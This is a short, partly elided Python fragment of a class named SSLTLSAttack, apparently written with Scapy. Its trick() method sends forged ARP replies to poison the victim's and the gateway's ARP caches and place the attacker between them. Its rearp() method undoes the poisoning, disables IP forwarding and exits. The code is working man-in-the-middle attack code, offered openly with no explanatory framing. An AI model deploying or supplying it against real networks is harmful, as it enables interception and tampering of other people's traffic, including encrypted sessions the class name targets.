...
class SSLTLSAttack:
    ...
    def rearp(self):
        ...
        send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
        send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=7)
        self.disable_ip_forwarding()
        print("[*] Shutting Down...")
        sys.exit(1)

    def trick(self, gateway_mac, victim_mac):
        send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=victim_mac))
        send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=gateway_mac))
